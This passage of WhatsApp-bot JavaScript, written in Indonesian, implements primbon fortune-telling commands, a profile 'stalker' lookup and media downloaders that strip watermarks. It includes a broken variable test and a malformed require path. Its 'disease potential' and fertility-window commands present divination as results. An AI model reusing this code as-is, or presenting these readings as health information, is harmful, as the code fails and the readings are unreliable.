                hisoka.sendText(m.chat, `⭔ *Nomor HP :* ${anu.message.nomer_hp}\n⭔ *Angka Shuzi :* ${anu.message.angka_shuzi}\n⭔ *Energi Positif :*\n- Kekayaan : ${anu.message.energi_positif.kekayaan}\n- Kesehatan : ${anu.message.energi_positif.kesehatan}\n- Cinta : ${anu.message.energi_positif.cinta}\n- Kestabilan : ${anu.message.energi_positif.kestabilan}\n- Persentase : ${anu.message.energi_positif.persentase}\n⭔ *Energi Negatif :*\n- Perselisihan : ${anu.message.energi_negatif.perselisihan}\n- Kehilangan : ${anu.message.energi_negatif.kehilangan}\n- Malapetaka : ${anu.message.energi_negatif.malapetaka}\n- Kehancuran : ${anu.message.energi_negatif.kehancuran}\n- Persentase : ${anu.message.energi_negatif.persentase}`, m)
            }
            break
            case 'artimimpi': case 'tafsirmimpi': {
                if (!text) throw `Example : ${prefix + command} belanja`
                let anu = await primbon.tafsir_mimpi(text)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendText(m.chat, `⭔ *Mimpi :* ${anu.message.mimpi}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Solusi :* ${anu.message.solusi}`, m)
            }
            break
            case 'ramalanjodoh': case 'ramaljodoh': {
                if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                let anu = await primbon.ramalan_jodoh(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendText(m.chat, `⭔ *Nama Anda :* ${anu.message.nama_anda.nama}\n⭔ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n⭔ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'ramalanjodohbali': case 'ramaljodohbali': {
                if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                let anu = await primbon.ramalan_jodoh_bali(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendText(m.chat, `⭔ *Nama Anda :* ${anu.message.nama_anda.nama}\n⭔ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n⭔ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'suamiistri': {
                if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                let anu = await primbon.suami_istri(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendText(m.chat, `⭔ *Nama Suami :* ${anu.message.suami.nama}\n⭔ *Lahir Suami :* ${anu.message.suami.tgl_lahir}\n⭔ *Nama Istri :* ${anu.message.istri.nama}\n⭔ *Lahir Istri :* ${anu.message.istri.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'ramalancinta': case 'ramalcinta': {
                if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                let anu = await primbon.ramalan_cinta(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendText(m.chat, `⭔ *Nama Anda :* ${anu.message.nama_anda.nama}\n⭔ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n⭔ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n⭔ *Sisi Positif :* ${anu.message.sisi_positif}\n⭔ *Sisi Negatif :* ${anu.message.sisi_negatif}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'artinama': {
                if (!text) throw `Example : ${prefix + command} Dika Ardianta`
                let anu = await primbon.arti_nama(text)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'kecocokannama': case 'cocoknama': {
                if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005`
                let [nama, tgl, bln, thn] = text.split`,`
                let anu = await primbon.kecocokan_nama(nama, tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Life Path :* ${anu.message.life_path}\n⭔ *Destiny :* ${anu.message.destiny}\n⭔ *Destiny Desire :* ${anu.message.destiny_desire}\n⭔ *Personality :* ${anu.message.personality}\n⭔ *Persentase :* ${anu.message.persentase_kecocokan}`, m)
            }
            break
            case 'kecocokanpasangan': case 'cocokpasangan': case 'pasangan': {
                if (!text) throw `Example : ${prefix + command} Dika|Novia`
                let [nama1, nama2] = text.split`|`
                let anu = await primbon.kecocokan_nama_pasangan(nama1, nama2)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendImage(m.chat,  anu.message.gambar, `⭔ *Nama Anda :* ${anu.message.nama_anda}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan}\n⭔ *Sisi Positif :* ${anu.message.sisi_positif}\n⭔ *Sisi Negatif :* ${anu.message.sisi_negatif}`, m)
            }
            break
            case 'jadianpernikahan': case 'jadiannikah': {
                if (!text) throw `Example : ${prefix + command} 6, 12, 2020`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.tanggal_jadian_pernikahan(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendText(m.chat, `⭔ *Tanggal Pernikahan :* ${anu.message.tanggal}\n⭔ *karakteristik :* ${anu.message.karakteristik}`, m)
            }
            break
            case 'sifatusaha': {
                if (!ext)throw `Example : ${prefix+ command} 28, 12, 2021`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.sifat_usaha_bisnis(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendText(m.chat, `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Usaha :* ${anu.message.usaha}`, m)
            }
            break
            case 'rejeki': case 'rezeki': {
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.rejeki_hoki_weton(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendText(m.chat, `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Rezeki :* ${anu.message.rejeki}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'pekerjaan': case 'kerja': {
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.pekerjaan_weton_lahir(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendText(m.chat, `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Pekerjaan :* ${anu.message.pekerjaan}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'ramalannasib': case 'ramalnasib': case 'nasib': {
                if (!text) throw `Example : 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.ramalan_nasib(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendText(m.chat, `⭔ *Analisa :* ${anu.message.analisa}\n⭔ *Angka Akar :* ${anu.message.angka_akar}\n⭔ *Sifat :* ${anu.message.sifat}\n⭔ *Elemen :* ${anu.message.elemen}\n⭔ *Angka Keberuntungan :* ${anu.message.angka_keberuntungan}`, m)
            }
            break
            case 'potensipenyakit': case 'penyakit': {
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.cek_potensi_penyakit(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendText(m.chat, `⭔ *Analisa :* ${anu.message.analisa}\n⭔ *Sektor :* ${anu.message.sektor}\n⭔ *Elemen :* ${anu.message.elemen}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'artitarot': case 'tarot': {
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.arti_kartu_tarot(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendImage(m.chat, anu.message.image, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Simbol Tarot :* ${anu.message.simbol_tarot}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'fengshui': {
                if (!text) throw `Example : ${prefix + command} Dika, 1, 2005\n\nNote : ${prefix + command} Nama, gender, tahun lahir\nGender : 1 untuk laki-laki & 2 untuk perempuan`
                let [nama, gender, tahun] = text.split`,`
                let anu = await primbon.perhitungan_feng_shui(nama, gender, tahun)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tahun_lahir}\n⭔ *Gender :* ${anu.message.jenis_kelamin}\n⭔ *Angka Kua :* ${anu.message.angka_kua}\n⭔ *Kelompok :* ${anu.message.kelompok}\n⭔ *Karakter :* ${anu.message.karakter}\n⭔ *Sektor Baik :* ${anu.message.sektor_baik}\n⭔ *Sektor Buruk :* ${anu.message.sektor_buruk}`, m)
            }
            break
            case 'haribaik': {
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.petung_hari_baik(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendText(m.chat, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Kala Tinantang :* ${anu.message.kala_tinantang}\n⭔ *Info :* ${anu.message.info}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'harisangar': case 'taliwangke': {
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.hari_sangar_taliwangke(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendText(m.chat, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Info :* ${anu.message.info}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'harinaas': case 'harisial': {
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.primbon_hari_naas(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendText(m.chat, `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hari Naas :* ${anu.message.hari_naas}\n⭔ *Info :* ${anu.message.catatan}\n⭔ *Catatan :* ${anu.message.info}`, m)
            }
            break
            case 'nagahari': case 'harinaga': {
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.rahasia_naga_hari(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendText(m.chat, `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Arah Naga Hari :* ${anu.message.arah_naga_hari}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'arahrejeki': case 'arahrezeki': {
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.primbon_arah_rejeki(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendText(m.chat, `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Arah Rezeki :* ${anu.message.arah_rejeki}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'peruntungan': {
                if (!text) throw `Example : ${prefix + command} DIka, 7, 7, 2005, 2022\n\nNote : ${prefix + command} Nama, tanggal lahir, bulan lahir, tahun lahir, untuk tahun`
                let [nama, tgl, bln, thn, untuk] = text.split`,`
                let anu = await primbon.ramalan_peruntungan(nama, tgl, bln, thn, untuk)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Peruntungan Tahun :* ${anu.message.peruntungan_tahun}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'weton': case 'wetonjawa': {
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.weton_jawa(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendText(m.chat, `⭔ *Tanggal :* ${anu.message.tanggal}\n⭔ *Jumlah Neptu :* ${anu.message.jumlah_neptu}\n⭔ *Watak Hari :* ${anu.message.watak_hari}\n⭔ *Naga Hari :* ${anu.message.naga_hari}\n⭔ *Jam Baik :* ${anu.message.jam_baik}\n⭔ *Watak Kelahiran :* ${anu.message.watak_kelahiran}`, m)
            }
            break
            case 'sifat': case 'karakter': {
                if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005`
                let [nama, tgl, bln, thn] = text.split`,`
                let anu = await primbon.sifat_karakter_tanggal_lahir(nama, tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Garis Hidup :* ${anu.message.garis_hidup}`, m)
            }
            break
            case 'keberuntungan': {
                if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005`
                let [nama, tgl, bln, thn] = text.split`,`
                let anu = await primbon.potensi_keberuntungan(nama, tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}`, m)
            }
            break
            case 'memancing': {
                if (!text) throw `Example : ${prefix + command} 12, 1, 2022`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.primbon_memancing_ikan(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendText(m.chat, `⭔ *Tanggal :* ${anu.message.tgl_memancing}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'masasubur': {
                if (!text) throw `Example : ${prefix + command} 12, 1, 2022, 28\n\nNote : ${prefix + command} hari pertama menstruasi, siklus`
                let [tgl, bln, thn, siklus] = text.split`,`
                let anu = await primbon.masa_subur(tgl, bln, thn, siklus)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendText(m.chat, `⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'zodiak': case 'zodiac': {
                if (!text) throw `Example : ${prefix+ command} 7 7 2005`
                let zodiak = [
                    ["capricorn", new Date(1970, 0, 1)],
                    ["aquarius", new Date(1970, 0, 20)],
                    ["pisces", new Date(1970, 1, 19)],
                    ["aries", new Date(1970, 2, 21)],
                    ["taurus", new Date(1970, 3, 21)],
                    ["gemini", new Date(1970, 4, 21)],
                    ["cancer", new Date(1970, 5, 22)],
                    ["leo", new Date(1970, 6, 23)],
                    ["virgo", new Date(1970, 7, 23)],
                    ["libra", new Date(1970, 8, 23)],
                    ["scorpio", new Date(1970, 9, 23)],
                    ["sagittarius", new Date(1970, 10, 22)],
                    ["capricorn", new Date(1970, 11, 22)]
                ].reverse()

                function getZodiac(month, day) {
                    let d = new Date(1970, month - 1, day)
                    return zodiak.find(([_,_d]) => d >= _d)[0]
                }
                let date = new Date(text)
                if (date == 'Invalid Date') throw date
                let d = new Date()
                let [tahun, bulan, tanggal] = [d.getFullYear(), d.getMonth() + 1, d.getDate()]
                let birth = [date.getFullYear(), date.getMonth() + 1, date.getDate()]

                let zodiac = await getZodiac(birth[1], birth[2])
                
                let anu = await primbon.zodiak(zodiac)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendText(m.chat, `⭔ *Zodiak :* ${anu.message.zodiak}\n⭔ *Nomor :* ${anu.message.nomor_keberuntungan}\n⭔ *Aroma :* ${anu.message.aroma_keberuntungan}\n⭔ *Planet :* ${anu.message.planet_yang_mengitari}\n⭔ *Bunga :* ${anu.message.bunga_keberuntungan}\n⭔ *Warna :* ${anu.message.warna_keberuntungan}\n⭔ *Batu :* ${anu.message.batu_keberuntungan}\n⭔ *Elemen :* ${anu.message.elemen_keberuntungan}\n⭔ *Pasangan Zodiak :* ${anu.message.pasangan_zodiak}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'shio': {
                if (!text) throw `Example : ${prefix + command} tikus\n\nNote : For Detail https://primbon.com/shio.htm`
                let anu = await primbon.shio(text)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendText(m.chat, `⭔ *Hasil :* ${anu.message}`, m)
            }
            break
	    case 'stalker': case 'stalk': {
		if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply('Limit Harian Anda Telah Habis')
                if (!text) return m.reply(`Example : ${prefix +command} type id\n\nList Type :\n1. ff (Free Fire)\n2. ml (Mobile Legends)\n3. aov (Arena Of Valor)\n4. cod (Call Of Duty)\n5. pb (point Blank)\n6. ig (Instagram)\n7. npm (https://npmjs.com)`)
                let [type, id, zone] = args
                if (type.toLowerCase() == 'ff') {
                    if (!id) throw `No Query id, Example ${prefix + command} ff 552992060`
                    let anu = await fetchJson(api('zenz', '/api/nickff', { apikey: global.APIKeys[global.APIs['zenz']], query: id }))
                    if (anu.status == false) return m.reply(anu.result.message)
                    m.reply(`ID : ${anu.result.gameId}\nUsername : ${anu.result.userName}`)
		    db.data.users[m.sender].limit -= 1
                } else if (type.toLowerCase() == 'ml') {
                    if (!id) throw `No Query id, Example : ${prefix + command} ml 214885010 2253`
                    if (!zone) throw `No Query id, Example : ${prefix + command} ml 214885010 2253`
                    let anu = await fetchJson(api('zenz', '/api/nickml', { apikey: global.APIKeys[global.APIs['zenz']], query: id, query2: zone }))
                    if (anu.status == false) return m.reply(anu.result.message)
                    m.reply(`ID : ${anu.result.gameId}\nZone : ${anu.result.zoneId}\nUsername : ${anu.result.userName}`)
		    db.data.users[m.sender].limit -= 1
                } else if (type.toLowerCase() == 'aov') {
                    if (!id) throw `No Query id, Example ${prefix + command} aov 293306941441181`
                    let anu = await fetchJson(api('zenz', '/api/nickaov', { apikey: global.APIKeys[global.APIs['zenz']], query: id }))
                    if (anu.status == false) return m.reply(anu.result.message)
                    m.reply(`ID : ${anu.result.gameId}\nUsername : ${anu.result.userName}`)
		    db.data.users[m.sender].limit -= 1
                } else if (type.toLowerCase() == 'cod') {
                    if (!id) throw `No Query id, Example ${prefix + command} cod 6290150021186841472`
                    let anu = await fetchJson(api('zenz', '/api/nickcod', { apikey: global.APIKeys[global.APIs['zenz']], query: id }))
                    if (anu.status == false) return m.reply(anu.result.message)
                    m.reply(`ID : ${anu.result.gameId}\nUsername : ${anu.result.userName}`)
		    db.data.users[m.sender].limit -= 1
                } else if (type.toLowerCase() == 'pb') {
                    if (!id) throw `No Query id, Example ${prefix + command} pb riio46`
                    let anu = await fetchJson(api('zenz', '/api/nickpb', { apikey: global.APIKeys[global.APIs['zenz']], query: id }))
                    if (anu.status == false) return m.reply(anu.result.message)
                    m.reply(`ID : ${anu.result.gameId}\nUsername : ${anu.result.userName}`)
		    db.data.users[m.sender].limit -= 1
                } else if (type.toLowerCase() == 'ig') {
                    if (!id) throw `No Query username, Example : ${prefix + command} ig cak_haho`
                    let { result: anu } = await fetchJson(api('zenz', '/api/stalker/ig', { username: id }, 'apikey'))
                    if (anu.status == false) return m.reply(anu.result.message)
                    hisoka.sendMedia(m.chat, anu.caption.profile_hd, '', `⭔ Full Name : ${anu.caption.full_name}\n⭔ User Name : ${anu.caption.user_name}\n⭔ ID ${anu.caption.user_id}\n⭔ Followers : ${anu.caption.followers}\n⭔ Following : ${anu.caption.following}\n⭔ Bussines : ${anu.caption.bussines}\n⭔ Profesional : ${anu.caption.profesional}\n⭔ Verified : ${anu.caption.verified}\n⭔ Private : ${anu.caption.private}\n⭔ Bio : ${anu.caption.biography}\n⭔ Bio Url : ${anu.caption.bio_url}`, m)
		    db.data.users[m.sender].limit -= 1
                } else if (type.toLowerCase() == 'npm') {
                    if (!id) throw `No Query username, Example : ${prefix + command} npm scrape-primbon`
                    let { result: anu } = await fetchJson(api('zenz', '/api/stalker/npm', { query: id }, 'apikey'))
                    if (anu.status == false) return m.reply(anu.result.message)
                    m.reply(`⭔ Name : ${anu.name}\n⭔ Version : ${Object.keys(anu.versions)}\n⭔ Created : ${tanggal(anu.time.created)}\n⭔ Modified : ${tanggal(anu.time.modified)}\n⭔ Maintainers :\n ${anu.maintainers.map(v => `- ${v.name} : ${v.email}`).join('\n')}\n\n⭔ Description : ${anu.description}\n⭔ Homepage : ${anu.homepage}\n⭔ Keywords : ${anu.keywords}\n⭔ Author : ${anu.author.name}\n⭔ License : ${anu.license}\n⭔ Readme : ${anu.readme}`)
		    db.data.users[m.sender].limit -= 1
                } else {
                    m.reply(`Example : ${prefix +command} type id\n\nList Type :\n1. ff (Free Fire)\n2. ml (Mobile Legends)\n3. aov (Arena Of Valor)\n4. cod (Call Of Duty)\n5. pb (point Blank)\n6. ig (Instagram)\n7. npm (https://npmjs.com)`)
                }
            }
            break
	        case 'tiktok': case 'tiktoknowm': {
                if (!text) throw 'Masukkan Query Link!'
                m.reply(mess.wait)
                let anu = await fetchJson(api('zenz', '/downloader/tiktok', { url: text }, 'apikey'))
                let buttons = [
                    {buttonId: `tiktokwm ${text}`, buttonText: {displayText: '► WITH WATERMARK'}, type: 1},
                    {buttonId: `tiktokmp3 ${text}`, buttonText: {displayText: '♫ AUDIO'}, type: 1}
                ]
                let buttonMessage = {
                    video: { url: anu.result.nowatermark },
                    caption: `Download From ${text}`,
                    footer: 'Tekan Tombol Dibawah',
                    buttons: buttons,
                    headerType: 5
                }
                hisoka.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case 'tiktokwm': case 'tiktokwatermark': {
                if (!text) throw 'Masukkan Query Link!'
                m.reply(mess.wait)
                let anu = await fetchJson(api('zenz', '/downloader/tiktok', { url: text }, 'apikey'))
                let buttons = [
                    {buttonId: `tiktoknowm ${text}`, buttonText: {displayText: '► NO WATERMARK'}, type: 1},
                    {buttonId: `tiktokmp3 ${text}`, buttonText: {displayText: '♫ AUDIO'}, type: 1}
                ]
                let buttonMessage = {
                    video: { url: anu.result.watermark },
                    caption: `Download From ${text}`,
                    footer: 'Tekan Tombol Dibawah',
                    buttons: buttons,
                    headerType: 5
                }
                hisoka.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case 'tiktokmp3': case 'tiktokaudio': {
                if (!text) throw 'Masukkan Query Link!'
                m.reply(mess.wait)
                let anu = await fetchJson(api('zenz', '/downloader/musically', { url: text }, 'apikey'))
                let buttons = [
                    {buttonId: `tiktoknowm ${text}`, buttonText: {displayText: '► NO WATERMARK'}, type: 1},
                    {buttonId: `tiktokwm ${text}`, buttonText: {displayText: '► WITH WATERMARK'}, type: 1}
                ]
                let buttonMessage = {
                    text: `Download From ${text}`,
                    footer: 'Tekan Tombol Dibawah',
                    buttons: buttons,
                    headerType: 2
                }
                let msg = await hisoka.sendMessage(m.chat, buttonMessage, { quoted: m })
                hisoka.sendMessage(m.chat, { audio: { url: anu.result.audio }, mimetype: 'audio/mpeg'}, { quoted: msg })
            }
            break
	        case 'instagram': case 'ig': case 'igdl': {
                if (!text) throw 'No Query Url!'
                m.reply(mess.wait)
                if (/(?:\/p\/|\/reel\/|\/tv\/)([^\s&]+)/.test(isUrl(text)[0])) {
                    let anu = await fetchJson(api('zenz', '/downloader/instagram2', { url: isUrl(text)[0] }, 'apikey'))
                    for (let media of anu.data) hisoka.sendMedia(m.chat, media, '', `Download Url Instagram From ${isUrl(text)[0]}`, m)
                } else if (/\/stories\/([^\s&]+)/.test(isUrl(text)[0])) {
                    let anu = await fetchJson(api('zenz', '/downloader/instastory', { url: isUrl(text)[0] }, 'apikey'))
                    hisoka.sendMedia(m.chat, anu.media[0].url, '', `Download Url Instagram From ${isUrl(text)[0]}`, m)
                }
            }
            break
		/** Backup misal yg atas ga keluar video **/
		case 'igeh': case 'instagram2': case 'ig2': case 'igdl2': {
                if (!text) throw 'Masukkan Query Link!'
                m.reply(mess.wait)
                
                let anu = await fetchJson(api('zenz', '/downloader/instagram2', { url:text }, 'apikey'))
                hisoka.sendMessage(m.chat, { video: { url: anu.data[0] } }, { quoted: m })
            }
            break
            case 'joox': case 'jooxdl': {
                if (!text) throw 'No Query Title'
                m.reply(mess.wait)
                let anu = await fetchJson(api('zenz', '/downloader/joox', { query: text }, 'apikey'))
                let msg = await hisoka.sendImage(m.chat, anu.result.img, `⭔ Title : ${anu.result.lagu}\n⭔ Album : ${anu.result.album}\n⭔ Singer : ${anu.result.penyanyi}\n⭔ Publish : ${anu.result.publish}\n⭔ Lirik :\n${anu.result.lirik.result}`, m)
                hisoka.sendMessage(m.chat, { audio: { url: anu.result.mp4aLink }, mimetype: 'audio/mpeg', fileName: anu.result.lagu+'.m4a' }, { quoted: msg })
            }
            break
            case 'soundcloud': case 'scdl': {
                if (!text) throw 'No Query Title'
                m.reply(mess.wait)
                let anu = await fetchJson(api('zenz', '/downloader/soundcloud', { url: isUrl(text)[0] }, 'apikey'))
                let msg = await hisoka.sendImage(m.chat, anu.result.thumb, `⭔ Title : ${anu.result.title}\n⭔ Url : ${isUrl(text)[0]}`)
                hisoka.sendMessage(m.chat, { audio: { url: anu.result.url }, mimetype: 'audio/mpeg', fileName: anu.result.title+'.m4a' }, { quoted: msg })
            }
            break
	        case 'twitdl': case 'twitter': {
                if (!text) throw 'Masukkan Query Link!'
                m.reply(mess.wait)
                let anu = await fetchJson(api('zenz', '/api/downloader/twitter', { url: text }, 'apikey'))
                let buttons = [
                    {buttonId: `twittermp3 ${text}`, buttonText: {displayText: '► AUDIO'}, type: 1}
                ]
                let buttonMessage = {
                    video: { url: anu.result.HD || anu.result.SD },
                    caption: util.format(anu.result),
                    footer: 'Tekan Tombol Dibawah',
                    buttons: buttons,
                    headerType: 5
                }
                hisoka.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case 'twittermp3': case 'twitteraudio': {
                if (!text) throw 'Masukkan Query Link!'
                m.reply(mess.wait)
                let anu = await fetchJson(api('zenz', '/api/downloader/twitter', { url: text }, 'apikey'))
                let buttons = [
                    {buttonId: `twitter ${text}`, buttonText: {displayText: '► VIDEO'}, type: 1}
                ]
                let buttonMessage = {
		    image: { url: anu.result.thumb },
                    caption: util.format(anu.result),
                    footer: 'Tekan Tombol Dibawah',
                    buttons: buttons,
                    headerType: 4
                }
                let msg = await hisoka.sendMessage(m.chat, buttonMessage, { quoted: m })
                hisoka.sendMessage(m.chat, { audio: { url: anu.result.audio } }, { quoted: msg })
            }
            break
	        case 'fbdl': case 'fb': case 'facebook': {
                if (!text) throw 'Masukkan Query Link!'
                m.reply(mess.wait)
                let anu = await fetchJson(api('zenz', '/api/downloader/facebook', { url: text }, 'apikey'))
                hisoka.sendMessage(m.chat, { video: { url: anu.result.url }, caption: `⭔ Title : ${anu.result.title}`}, { quoted: m })
            }
            break
	        case 'pindl': case 'pinterestdl': {
                if (!text) throw 'Masukkan Query Link!'
                m.reply(mess.wait)
                let anu = await fetchJson(api('zenz', '/api/downloader/pinterestdl', { url: text }, 'apikey'))
                hisoka.sendMessage(m.chat, { video: { url: anu.result }, caption: `Download From ${text}` }, { quoted: m })
            }
            break
            case 'umma': case 'ummadl': {
	        if (!text) throw `Example : ${prefix + command} https://umma.id/channel/video/post/gus-arafat-sumber-kecewa-84464612933698`
                let { umma } = require('./lib) scraper')
		let anu = await umma(isUrl(text)[0])
		if (anu.type == 'video') {
		    let buttons = [
                        {buttonId: `ytmp3 ${anu.media[0]} 128kbps`, buttonText: {displayText: '♫ AUDIO'}, type: 1},
                        {buttonId: `ytmp4 ${anu.media[0]} 360p`, buttonText: {displayText: '► VIDEO'}, type: 1}
                    ]
		    let buttonMessage = {
		        image: { url: anu.author.profilePic },
			caption: `
⭔ Title : ${anu.title}
⭔ Author : ${anu.author.name}
⭔ Like : ${anu.like}
⭔ Caption : ${anu.caption}
⭔ Url : ${anu.media[0]}
Untuk Download Media Silahkan Klik salah satu Button dibawah ini atau masukkan command ytmp3/ytmp4 dengan url diatas
`,
			footer: 'NelzBotz',
			buttons,
